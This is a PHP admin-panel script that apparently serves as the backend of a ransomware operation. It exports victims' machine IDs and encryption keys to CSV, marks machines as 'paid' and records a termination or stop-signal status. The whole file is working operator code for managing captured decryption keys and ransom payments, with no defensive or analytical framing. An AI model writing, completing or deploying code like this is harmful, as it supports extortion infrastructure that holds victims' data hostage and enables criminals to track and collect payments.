<?php

global $pdo;
session_start();

// Step 1: Redirect to the login page if not logged in
if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("location: login.php");
    exit;
}

// Step 2: Include the database connection file
require_once "../includes/db.php";

// Step 3: Handle CSV Export
if (isset($_GET['action']) && $_GET['action'] == 'export') {
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="machine_keys.csv"');
    $output = fopen("php://output", "w");
    fputcsv($output, array('S.N', 'Machine ID', 'Encryption Key', 'Received Date', 'Status'));
    /** @noinspection ALL */
    $stmt = $pdo->query("SELECT machine_id, encryption_key, received_date, status FROM machine_keys ORDER BY received_date DESC");
    $sn = 1;
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        fputcsv($output, array($sn++, $row['machine_id'], $row['encryption_key'], $row['received_date'], $row['status']));
    }
    fclose($output);
    exit();
}


// Step 4: Handle Mark as Paid
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['markPaid'])) {

    $machineId = $_POST['machineId'];
    /** @noinspection ALL */
    $updateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'paid' WHERE key_id = ?");

    if ($updateStmt->execute([$machineId])) {
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh the page

        exit;
    }
}

// Step 5: Handle Termination Signal Update
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['terminate'])) {

    $machineId = $_POST['machineId'];
    /** @noinspection ALL */
    $terminateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'terminated' WHERE id = ? AND stop_signal = 1");

    if ($terminateStmt->execute([$machineId])) {
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh the page
        exit;
    }
}